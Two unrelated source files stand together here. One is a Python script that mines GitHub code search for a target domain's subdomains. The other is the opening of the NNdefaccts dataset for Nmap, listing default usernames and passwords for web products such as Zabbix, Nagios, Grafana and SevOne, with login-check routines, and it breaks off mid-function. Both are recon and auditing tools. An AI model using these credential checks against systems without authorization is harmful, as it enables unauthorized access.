#!/usr/bin/python3.5

# I don't believe in license.
# You can do whatever you want with this program.

import os
import sys
import re
import time
import requests
import random
import argparse
from functools import partial
from colored import fg, bg, attr
from multiprocessing.dummy import Pool


TOKENS_FILE = os.path.dirname(os.path.realpath(__file__))+'/.tokens'


def githubApiSearchCode( search, page ):
    headers = {"Authorization":"token "+random.choice(t_tokens)}
    url = 'https://api.github.com/search/code?s=indexed&type=Code&o=desc&q=' + search + '&page=' + str(page)
    # print(url)

    try:
        r = requests.get( url, headers=headers, timeout=5 )
        json = r.json()
        return json
    except Exception as e:
        print( "%s[-] error occurred: %s%s" % (fg('red'),e,attr(0)) )
        return False


def getRawUrl( result ):
    raw_url = result['html_url'];
    raw_url = raw_url.replace( 'https://github.com/', 'https://raw.githubusercontent.com/' )
    raw_url = raw_url.replace( '/blob/', '/' )
    return raw_url;


def readCode( regexp, source, result ):
    url = getRawUrl( result )
    code = doGetCode( url )
    # print(code)

    if code:
        matches = re.findall( regexp, code )
        if matches:
            for sub in  matches:
                # print(sub)
                sub = sub[0].replace('2F','').lower().strip()
                if len(sub) and not sub in t_history:
                    t_history.append( sub )
                    sys.stdout.write( "%s" % sub )
                    if source:
                        sys.stdout.write( "\t-> %s" % result['html_url'] )
                    sys.stdout.write( "\n" )


def doGetCode( url ):
    # print( url )
    try:
        r = requests.get( url, timeout=5 )
    except Exception as e:
        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        return False

    return r.text


parser = argparse.ArgumentParser()
parser.add_argument( "-t","--token",help="auth token (required)" )
parser.add_argument( "-d","--domain",help="domain you are looking for (required)" )
parser.add_argument( "-e","--extend",help="also look for <dummy>example.com", action="store_true" )
parser.add_argument( "-s","--source",help="display first url where subdomains are found", action="store_true" )
parser.parse_args()
args = parser.parse_args()

t_tokens = []
if args.token:
    t_tokens = args.token.split(',')
else:
    if os.path.isfile(TOKENS_FILE):
        fp = open(TOKENS_FILE,'r')
        t_tokens = fp.read().split("\n")
        fp.close()

if not len(t_tokens):
    parser.error( 'auth token is missing' )

if args.source:
    _source = True
else:
    _source = False

if args.domain:
    _domain = args.domain
else:
    parser.error( 'domain is missing' )

t_history = []
page = 1
_search = '"' + _domain + '"'

### this is a test, looks like we got more result that way
import tldextract
t_host_parse = tldextract.extract( _domain )
_search = '"' + t_host_parse.domain + '"'
# print( t_host_parse )
# exit()
###

# egrep -io "[0-9a-z_\-\.]+\.([0-9a-z_\-]+)?`echo $h|awk -F '.' '{print $(NF-1)}'`([0-9a-z_\-\.]+)?\.[a-z]{1,5}"


if args.extend:
    # _regexp = r'[0-9a-zA-Z_\-\.]+' + _domain.replace('.','\.')
    _regexp = r'([0-9a-z_\-\.]+\.([0-9a-z_\-]+)?'+t_host_parse.domain+'([0-9a-z_\-\.]+)?\.[a-z]{1,5})'
else:
    _regexp = r'(([0-9a-zA-Z_\-\.]+)\.' + _domain.replace('.','\.')+')'
# print(_regexp)

# for page in range(1,10):
while True:
    time.sleep( 1 )
    t_json = githubApiSearchCode( _search, page )
    # print(t_json)
    page = page + 1

    if not t_json or 'documentation_url' in t_json or not 'items' in t_json or not len(t_json['items']):
        break

    pool = Pool( 30 )
    pool.map( partial(readCode,_regexp,_source), t_json['items'] )
    pool.close()
    pool.join()

--[[
This file is part of NNdefaccts, an alternate fingerprint dataset for
Nmap script http-default-accounts.

NNdefaccts is Copyright (c) 2012-2019 by nnposter
(nnposter /at/ users.sourceforge.net, <https://github.com/nnposter>)

NNdefaccts is free software: you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the Free
Software Foundation, either version 3 of the License, or (at your option)
any later version.

NNdefaccts is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
for more details.

You should have received a copy of the GNU General Public License along
with this program.  If not, see <http://www.gnu.org/licenses/>.

Note that NNdefaccts is licensed separately from Nmap.  By obtaining
a custom license for Nmap you are not automatically entitled to modify or
distribute the NNdefaccts dataset to the same extent as Nmap itself and,
conversely, licensing NNdefaccts does not cover Nmap.  For details, see
<https://github.com/nnposter/nndefaccts/COPYING>.

You can obtain the latest version of the dataset from its public repository
at <https://github.com/nnposter/nndefaccts/>.

To report bugs and other problems, contribute patches, request a feature,
provide generic feedback, etc., please see instructions posted at
<https://github.com/nnposter/nndefaccts/README.md>.
]]


local base64 = require "base64"
local http = require "http"
local json = require "json"
local math = require "math"
local os = require "os"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"
local url = require "url"
local have_openssl, openssl = pcall(require, "openssl")
local have_rand, rand = pcall(require, "rand")
local have_stringaux, stringaux = pcall(require, "stringaux")
local have_tableaux, tableaux = pcall(require, "tableaux")

---
-- http-default-accounts-fingerprints-nndefaccts.lua
-- This file contains fingerprint data for http-default-accounts.nse
--
-- STRUCTURE:
-- * <code>name</code> - Descriptive name
-- * <code>cpe</code> - Official CPE Dictionary entry (optional)
-- * <code>category</code> - Category
-- * <code>login_combos</code> - Table of default credential pairs
---- * <code>username</code>
---- * <code>password</code>
-- * <code>paths</code> - Table of likely locations (paths) of the target
-- * <code>target_check</code> - Validation function of the target
--                               (optional but highly recommended)
-- * <code>login_check</code> - Login function of the target
---

---
-- Backwards compatibility provisions for library rand
---
if not have_rand then
  rand = {}
end
if not rand.random_string then
  rand.random_string = stdnse.generate_random_string
end

---
-- Generates a random alphanumeric string.
--
-- @param len Length of the output string.
-- @return A random string consisting of letters and digits
---
local function random_alnum (len)
  return rand.random_string(len, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
end

---
-- Generates a random hexadecimal string.
--
-- @param len Length of the output string.
-- @return A random string consisting of hexadecimal digits
---
local function random_hex (len)
  return rand.random_string(len, "0123456789abcdef")
end

---
-- Backwards compatibility provisions for library stringaux
---
if not have_stringaux then
  stringaux = {}
end
if not stringaux.ipattern then
  stringaux.ipattern = stdnse.generate_case_insensitive_pattern
end

---
-- Backwards compatibility provisions for library tableaux
---
if not have_tableaux then
  tableaux = {}
end
if not tableaux.tcopy then
  tableaux.tcopy =
    function (tbl)
      local clone = {}
      for k,v in pairs(tbl) do
        clone[k] = type(v) == "table" and tableaux.tcopy(v) or v
      end
      return clone
    end
end
if not tableaux.contains then
  tableaux.contains = stdnse.contains
end

---
-- Requests given path using http.get() but disabling cache and redirects.
-- @param host The host to connect to
-- @param port The port to connect to
-- @param path The path to retrieve
-- @param options [optional] A table of HTTP request options
-- @return A response table (see library http.lua for description)
---
local function http_get_simple (host, port, path, options)
  local opts = tableaux.tcopy(options or {})
  opts.bypass_cache = true
  opts.no_cache = true
  opts.redirect_ok = false
  return http.get(host, port, path, opts)
end

---
-- Requests given path using http.post() but disabling cache and redirects.
-- (The current implementation of http.post() does not use either; this is
-- a defensive wrapper to guard against future problems.)
-- @param host The host to connect to
-- @param port The port to connect to
-- @param path The path to retrieve
-- @param options [optional] A table of HTTP request options
-- @param postdata A string or a table of data to be posted
-- @return A response table (see library http.lua for description)
---
local function http_post_simple (host, port, path, options, postdata)
  local opts = tableaux.tcopy(options or {})
  opts.no_cache = true
  opts.redirect_ok = false
  return http.post(host, port, path, opts, nil, postdata)
end

---
-- Requests given path using http_post_simple() with the body formatted as
-- Content-Type multipart/form-data.
-- @param host The host to connect to
-- @param port The port to connect to
-- @param path The path to retrieve
-- @param options [optional] A table of HTTP request options
-- @param postdata A table of data to be posted
-- @return A response table (see library http.lua for description)
---
local function http_post_multipart (host, port, path, options, postdata)
  local boundary = ("-"):rep(20)
                   .. math.random(1000000, 9999999)
                   .. math.random(1000000, 9999999)
  local opts = tableaux.tcopy(options or {})
  opts.header = opts.header or {}
  opts.header["Content-Type"] = "multipart/form-data; boundary=" .. boundary
  if type(postdata) ~= "table" then
    return {status = nil,
           ["status-line"] = "POST data must be a table",
           header = {},
           rawheader = {}}
  end
  boundary = "--" .. boundary
  local body = {}
  for k, v in pairs(postdata) do
    table.insert(body, boundary)
    table.insert(body, ('Content-Disposition: form-data; name="%s"'):format(k))
    table.insert(body, "")
    table.insert(body, v)
  end
  table.insert(body, boundary .. "--")
  table.insert(body, "")
  return http_post_simple (host, port, path, opts, table.concat(body, "\r\n"))
end

---
-- Requests given path using native HTTP authentication.
-- @param host Host table
-- @param port Port table
-- @param path Path to request
-- @param user HTTP authentication username
-- @param pass HTTP authentication password
-- @param digest true: digest auth, false: basic auth, "any": try to detect
-- @return True if login in was successful
---
local function try_http_auth (host, port, path, user, pass, digest)
  if digest == "any" then
    local resp = http_get_simple(host, port, path)
    local auth = (resp.header["www-authenticate"] or ""):lower():match("^%w+")
    if not auth then return end
    digest = auth == "digest"
  end
  local creds = {username = user, password = pass, digest = digest}
  local resp = http_get_simple(host, port, path, {auth=creds})
  return resp.status and not (resp.status >= 400 and resp.status <= 405)
end

---
-- Returns authentication realm advertised in an HTTP response
-- @param response HTTP response object, such as a result from http.get()
-- @return realm found in response header WWW-Authenticate
--               (or nil if not present)
---
local function http_auth_realm (response)
  local auth = response.header["www-authenticate"] or ""
  -- NB: "OEM Netcam" devices lack the closing double quote
  return auth:match('%srealm%s*=%s*"([^"]*)')
end

---
-- Tests whether an HTTP response sets a named cookie with a given value
-- @param response a standard HTTP response object
-- @param name a case-insensitive cookie name that must be set
-- @param pattern to validate the cookie value
-- @return cookie value if such a cookie is found
---
local function get_cookie (response, name, pattern)
  name = name:lower()
  for _, ck in ipairs(response.cookies or {}) do
    if ck.name:lower() == name and (not pattern or ck.value:find(pattern)) then
      return ck.value
    end
  end
  return false
end

---
-- Parses an HTML tag and returns parsed attributes
-- @param html a string representing HTML tag. It is expected that the first
-- and last characters are angle brackets.
-- @return table of attributes with their names converted to lowercase
---
local function parse_tag (html)
  local attrs = {}
  local _, pos = html:find("^<%f[%w][%w-]+[^%w-]")
  while true do
    local attr, equal
    _, pos, attr, equal = html:find("%f[%w]([%w-]+)%s*(=?)%s*", pos)
    if not pos then break end
    local oldpos = pos + 1
    if equal == "=" then
      local c = html:sub(oldpos, oldpos)
      if c == "\"" or c == "'" then
        oldpos = oldpos + 1
        pos = html:find(c, oldpos, true)
      else
        pos = html:find("[%s>]", oldpos)
      end
      if not pos then break end
    else
      pos = oldpos
    end
    attrs[attr:lower()] = html:sub(oldpos, pos - 1)
  end
  return attrs
end

---
-- Searches given HTML string for an element tag that meets given attribute
-- critera and returns its position and all its attributes
-- @param html a string representing HTML test
-- @param elem an element to search for (for example "img" or "div")
-- @param criteria a table of attribute names and corresponding patterns,
-- for example {id="^secret$"}. The patterns are treated as case-insensitive.
-- (optional)
-- @param init a string position from which to start searching (optional)
-- @return position of the opening angle bracket of the found tag or nil
-- @return position of the closing angle bracket of the found tag or nil
-- @return table of tag attributes with their names converted to lowercase
---
local function find_tag (html, elem, criteria, init)
  local icrit = {}
  for cnam, cptn in pairs(criteria or {}) do
    icrit[cnam:lower()] = stringaux.ipattern(cptn)
  end
  local tptn = stringaux.ipattern("<" .. elem:gsub("%-", "%%-") .. "%f[%s/>].->")
  local start
  local stop = init
  while true do
    start, stop = html:find(tptn, stop)
    if not start then break end
    local attrs = parse_tag(html:sub(start, stop))
    local found = true
    for cnam, cptn in pairs(icrit) do
      local cval = attrs[cnam]
      if not (cval and cval:find(cptn)) then
        found = false
        break
      end
    end
    if found then return start, stop, attrs end
  end
  return
end

---
-- Searches given HTML string for an element tag that meets given attribute
-- critera and returns all its attributes
-- @param html a string representing HTML test
-- @param elem an element to search for (for example "img" or "div")
-- @param criteria a table of attribute names and corresponding patterns,
-- for example {id="^secret$"}. The patterns are treated as case-insensitive.
-- (optional)
-- @param init a string position from which to start searching (optional)
-- @return table of tag attributes with their names converted to lowercase
---
local function get_tag (html, elem, criteria, init)
  local start, stop, attrs = find_tag(html, elem, criteria, init)
  return attrs
end

---
-- Builds an iterator function that searches given HTML string for element tags
-- that meets given attribute critera
-- @param html a string representing HTML test
-- @param elem an element to search for (for example "img" or "div")
-- @param criteria a table of attribute names and corresponding patterns,
-- for example {id="^secret$"}. The patterns are treated as case-insensitive.
-- (optional)
-- @param init a string position from which to start searching (optional)
-- @return iterator
---
local function get_tags (html, elem, criteria)
  local init = 0
  return function ()
           local _, attrs
           _, init, attrs = find_tag(html, elem, criteria, (init or #html) + 1)
           return attrs
         end
end

---
-- Searches given HTML string for an element tag that meets given attribute
-- critera and returns inner HTML of the corresponding element
-- (Nested elements of the same type are not supported.)
-- @param html a string representing HTML test
-- @param elem an element to search for (for example "div" or "title")
-- @param criteria a table of attribute names and corresponding patterns,
-- for example {id="^secret$"}. The patterns are treated as case-insensitive.
-- (optional)
-- @param init a string position from which to start searching (optional)
-- @return inner HTML
---
local function get_tag_html (html, elem, criteria, init)
  local _, start, attrs = find_tag(html, elem, criteria, init)
  if not start then return end
  start = start + 1
  local stop = html:find(stringaux.ipattern("</" .. elem:gsub("%-", "%%-") .. "[%s>]"), start)
  return stop and html:sub(start, stop - 1) or nil
end

---
-- Searches given HTML string for a meta refresh tag and returns the target URL
-- @param html a string representing HTML test
-- @param criteria a pattern to validate the extracted target URL
-- for example {id="^secret$"}. The patterns are treated as case-insensitive.
-- (optional)
-- @param init a string position from which to start searching (optional)
-- @return table of tag attributes with their names converted to lowercase
---
local function get_refresh_url (html, criteria)
  local refresh = get_tag(html, "meta", {["http-equiv"]="^refresh$", content="^0;%s*url="})
  if not refresh then return end
  local url = refresh.content:match("=(.*)")
  return url:find(stringaux.ipattern(criteria)) and url or nil
end

---
-- Generates default scheme, host, and port components for a parsed URL.
--
-- This filter function generates the scheme, host, and port components from
-- the standard <code>host</code> and <code>port</code> script objects. These
-- components can then be passed onto function <code>url.build</code>.
--
-- As an example, the following code generates a URL for path "/test/"
-- on the current host and port:
-- <code>
-- local testurl = url.build(url_build_defaults(host, port, {path = "/test/"}))
-- </code>
-- or, alternatively, when not used as a filter:
-- <code>
-- local parsed = url_build_defaults(host, port)
-- parsed.path = "/test/"
-- local testurl = url.build(parsed)
-- </code>
--
-- @param host The host the URL is intended for.
-- @param port The port the URL is intended for.
-- @param parsed Parsed URL, as typically returned by <code>url.parse</code>,
-- or nil. The table can be be missing the scheme, host, and port components.
-- @return A clone of the parsed URL, with any missing scheme, host, and port
-- components added.
-- @see url.parse
-- @see url.build
---
local function url_build_defaults (host, port, parsed)
  local parts = tableaux.tcopy(parsed or {})
  parts.host = parts.host or stdnse.get_hostname(host, port)
  parts.scheme = parts.scheme or shortport.ssl(host, port) and "https" or "http"
  if not parts.port and port.number ~= url.get_default_port(parts.scheme) then
    parts.port = port.number
  end
  return parts
end

---
-- Encodes a string to make it safe for embedding into XML/HTML.
--
-- @param s The string to be encoded.
-- @return A string with unsafe characters encoded
---
local function xmlencode (s)
  return s:gsub("%W", function (c) return ("&#x%x;"):format(c:byte()) end)
end

---
-- Decodes an XML-encoded string.
--
-- @param s The string to be decoded.
-- @return A string with XML encoding stripped off
---
local function xmldecode (s)
  local refmap = {amp = "&", quot = "\"", apos = "'", lt ="<", gt = ">"}
  return s:gsub("&.-;",
               function (e)
                 local r = e:sub(2,-2)
                 if r:find("^#x%x%x$") then
                   return stdnse.fromhex(r:sub(3))
                 end
                 return refmap[r]
               end)
end

---
-- Performs URL encoding of all characters in a string.
--
-- @param s The string to be encoded.
-- @return A URL-encoded string
---
local function urlencode_all (s)
  return s:gsub(".", function (c) return ("%%%02x"):format(c:byte()) end)
end

---
-- Decodes a base64-encoded string safely, catching any decoding errors.
--
-- @param s The string to be decoded.
-- @return A decoded string or nil if the input is invalid
---
local function b64decode (s)
  local status, out = pcall(base64.dec, s)
  return status and out or nil
end


fingerprints = {}

---
--WEB
---
table.insert(fingerprints, {
  name = "Ansible AWX",
  cpe = "cpe:/a:ansible:tower",
  category = "web",
  paths = {
    {path = "/api/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and get_cookie(response, "csrftoken", "^%w+$")
           and response.body
           and response.body:find("AWX REST API", 1, true)) then
      return false
    end
    local jstatus, jout = json.parse(response.body)
    return jstatus and jout.description == "AWX REST API"
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if resp1.status ~= 200 then return false end
    local token = get_cookie(resp1, "csrftoken")
    if not token then return false end
    local form = {username=user,
                  password=pass,
                  next=path}
    local header = {["X-CSRFToken"]=token}
    local resp2 = http_post_simple(host, port, url.absolute(path, "login/"),
                                  {cookies=resp1.cookies, header=header}, form)
    return resp2.status == 302
           and resp2.header["location"] == path
           and get_cookie(resp2, "userLoggedIn") == "true"
  end
})

table.insert(fingerprints, {
  name = "Cacti",
  cpe = "cpe:/a:cacti:cacti",
  category = "web",
  paths = {
    {path = "/"},
    {path = "/cacti/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (get_cookie(response, "Cacti") or get_cookie(response, "CactiEZ"))
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {action="login",
                  login_username=user,
                  login_password=pass}
    local resp = http_post_simple(host, port, url.absolute(path, "index.php"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Zabbix",
  cpe = "cpe:/a:zabbix:zabbix",
  category = "web",
  paths = {
    {path = "/zabbix/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200 and get_cookie(response, "zbx_sessionid")
  end,
  login_combos = {
    {username = "admin", password = "zabbix"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {request="",
                  name=user,
                  password=pass,
                  enter="Sign in"}
    local resp = http_post_simple(host, port, url.absolute(path, "index.php"),
                                 nil, form)
    return resp.status == 302 and resp.header["location"] == "dashboard.php"
  end
})

table.insert(fingerprints, {
  name = "Xplico",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302 and get_cookie(response, "Xplico")
  end,
  login_combos = {
    {username = "admin", password = "xplico"},
    {username = "xplico", password = "xplico"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "users/login")
    local resp1 = http_get_simple(host, port, lurl)
    if not (resp1.status == 200 and resp1.body) then return false end
    local html = get_tag_html(resp1.body, "form", {action="/users/login$"})
    if not html then return false end
    local form = {}
    for input in get_tags(html, "input", {type="^hidden$", name="", value=""}) do
      form[input.name] = input.value
    end
    form["data[User][username]"] = user
    form["data[User][password]"] = pass
    local resp2 = http_post_simple(host, port, lurl,
                                  {cookies=resp1.cookies}, form)
    local loc = resp2.header["location"] or ""
    return resp2.status == 302
           and (loc:find("/admins$") or loc:find("/pols/index$"))
  end
})

table.insert(fingerprints, {
  name = "ExtraHop Web UI",
  category = "web",
  paths = {
    {path = "/extrahop/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("csrfmiddlewaretoken", 1, true)
           and response.body:lower():find("<title>extrahop login", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^csrfmiddlewaretoken$", value=""})
    if not token then return false end
    local form = {[token.name]=token.value,
                  next=path,
                  username=user,
                  password=pass}
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=path}))}
    local resp2 = http_post_simple(host, port, path,
                                  {cookies=resp1.cookies, header=header}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):sub(-#path) == path
  end
})

table.insert(fingerprints, {
  name = "Nagios",
  cpe = "cpe:/a:nagios:nagios",
  category = "web",
  paths = {
    {path = "/"},
    {path = "/nagios/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Nagios Access"
  end,
  login_combos = {
    {username = "nagiosadmin", password = "nagios"},
    {username = "nagiosadmin", password = "nagiosadmin"},
    {username = "nagiosadmin", password = "PASSW0RD"},
    {username = "nagiosadmin", password = "CactiEZ"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "ManageEngine OpManager 10/11",
  cpe = "cpe:/a:zohocorp:manageengine_opmanager",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("%Wwindow%.location%.href%s*=%s*(['\"])[^'\"]-/LoginPage%.do%1")) then
      return false
    end
    local resp = http_get_simple(host, port, url.absolute(path, "LoginPage.do"))
    return resp.status == 200
           and resp.body
           and resp.body:find("ManageEngine", 1, true)
           and resp.body:lower():find("<title>%s*manageengine opmanager%s*</title>")
           and get_tag(resp.body, "form", {action="/jsp/login%.do$"})
  end,
  login_combos = {
    {username = "IntegrationUser", password = "plugin"},
    {username = "admin",           password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "LoginPage.do"))
    if resp1.status ~= 200 then return false end
    local form2 = {clienttype="html",
                   isCookieADAuth="",
                   domainName="NULL",
                   authType="localUserLogin",
                   webstart="",
                   ScreenWidth=1024,
                   ScreenHeight=768,
                   loginFromCookieData="",
                   userName=user,
                   password=pass,
                   uname=""}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "jsp/Login.do"),
                                  {cookies=resp1.cookies}, form2)
    return (resp2.status == 200 or resp2.status == 302)
           and get_cookie(resp2, "OPUTILSTICKET", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "ManageEngine OpManager 12",
  cpe = "cpe:/a:zohocorp:manageengine_opmanager",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ManageEngine", 1, true)
           and response.body:lower():find("<title>%s*manageengine opmanager%s*</title>")
           and get_tag(response.body, "form", {action="^j_security_check%f[;\0]"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if resp1.status ~= 200 then return false end
    local form2 = {AUTHRULE_NAME="Authenticator",
                   clienttype="html",
                   ScreenWidth=1024,
                   ScreenHeight=768,
                   loginFromCookieData="false",
                   ntlmv2="false",
                   j_username=user,
                   j_password=pass,
                   domainNameAD="Authenticator",
                   uname=""}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "j_security_check"),
                                  {cookies=resp1.cookies}, form2)
    return resp2.status == 303
           and (resp2.header["location"] or ""):sub(-#path) == path
  end
})

table.insert(fingerprints, {
  name = "ntopng",
  cpe = "cpe:/a:ntop:ntopng",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = response.header["location"] or ""
    if not (response.status == 302
           and loc:find("/lua/login.lua?referer=", 1, true)
           and get_cookie(response, "session") == "") then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("ntopng", 1, true)
           and resp.body:lower():find("<title>welcome to ntopng</title>", 1, true)
           and get_tag(resp.body, "form", {action="/authorize%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {user=user,
                  password=pass,
                  referer=host.name .. path}
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "authorize.html"),
                                  nil, form)
    return resp.status == 302
           and resp.header["location"] == path
           and get_cookie(resp, "user") == user
  end
})

table.insert(fingerprints, {
  name = "OpenNMS",
  cpe = "cpe:/a:opennms:opennms",
  category = "web",
  paths = {
    {path = "/login.jsp"},
    {path = "/opennms/login.jsp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("OpenNMS", 1, true)
           and response.body:lower():find("<title>%s*opennms web console%s*</title>")
           and get_tag(response.body, "input", {name="^j_username$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "rtc",   password = "rtc"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {j_username=user,
                  j_password=pass,
                  j_usergroups="",
                  Login=""}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "j_spring_security_check"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/index%.jsp%f[?\0]")
  end
})

table.insert(fingerprints, {
  name = "SevOne NMS",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "SEVONE")
           and response.body
           and response.body:lower():find("<title>sevone nms - network manager", 1, true)
  end,
  login_combos = {
    {username = "Admin",       password = "SevOne"},
    {username = "SevOneStats", password = "n3v3rd13"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = resp1.body:match("GlobalData%.Utilities%.Xsrf%.setToken%(%s*['\"](%x+)")
    if not token then return false end
    local form = {login=user,
                  passwd=pass,
                  browser="mozilla",
                  version=52,
                  tzString=os.date("!%a %b %d %Y %H:%M:%S GMT+0000"),
                  check_tz=0}
    local refpath = url.absolute(path, "doms/login/index.php")
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=refpath})),
                    ["X-CSRFToken"]=token}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(refpath, "processLogin.php"),
                                  {cookies=resp1.cookies, header=header}, form)
    if not (resp2.status == 200 and resp2.body) then return false end
    local jstatus, jout = json.parse(resp2.body)
    return jstatus and (jout.status == 0 or jout.status == -3)
  end
})

table.insert(fingerprints, {
  name = "Device42 Appliance Manager",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302 and get_cookie(response, "d42amid")
  end,
  login_combos = {
    {username = "d42admin", password = "default"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "accounts/login/")
    local resp1 = http_get_simple(host, port, lurl .. "?next=" .. path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local form = {csrfmiddlewaretoken=get_cookie(resp1, "d42amid_csrftoken"),
                  username=user,
                  password=pass,
                  next=path}
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=lurl}))}
    local resp2 = http_post_simple(host, port, lurl,
                                  {cookies=resp1.cookies, header=header}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):sub(-#path) == path
  end
})

table.insert(fingerprints, {
  name = "Grafana",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302 and get_cookie(response, "grafana_sess")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Accept"]="application/json, text/plain, */*",
                    ["Content-Type"]="application/json;charset=utf-8"}
    local jin = {user=user, email="", password=pass}
    json.make_object(jin)
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 {header=header}, json.generate(jin))
    return resp.status == 200 and get_cookie(resp, "grafana_user") == user
  end
})

table.insert(fingerprints, {
  name = "Apache Ambari",
  cpe = "cpe:/a:apache:ambari",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">Ambari<", 1, true)
           and response.body:lower():find("<title>ambari</title>", 1, true)
           and get_tag(response.body, "script", {src="^javascripts/app%.js$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "api/v1/users/admin"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Cloudera Manager",
  cpe = "cpe:/a:cloudera:cloudera_manager",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "CLOUDERA_MANAGER_SESSIONID")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {j_username=user,
                  j_password=pass,
                  returnUrl="",
                  submit=""}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "j_spring_security_check"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/cmf/postLogin%f[?\0]")
  end
})

table.insert(fingerprints, {
  name = "OpenDaylight",
  cpe = "cpe:/a:opendaylight:opendaylight",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "JSESSIONID", "^%x+$")
           and response.body
           and response.body:find("OpenDaylight", 1, true)
           and response.body:lower():find("<title>opendaylight ", 1, true)
           and get_tag(response.body, "form", {action="^j_security_check%f[;\0]"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if resp1.status ~= 200 then return false end
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "j_security_check"),
                                  {cookies=resp1.cookies},
                                  {j_username=user, j_password=pass})
    return resp2.status == 302
           and (resp2.header["location"] or ""):find(path, -#path, true)
  end
})

table.insert(fingerprints, {
  name = "OrientDB Studio",
  cpe = "cpe:/a:orientdb:orientdb",
  category = "web",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("OrientDB", 1, true)
           and get_tag(response.body, "meta", {content="^OrientDB Studio$"})
           and get_refresh_url(response.body, "/studio/index%.html$")
  end,
  login_combos = {
    {username = "reader", password = "reader"},
    {username = "writer", password = "writer"},
    {username = "admin",  password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "listDatabases"))
    if not (resp1.status == 200 and resp1.body) then return false end
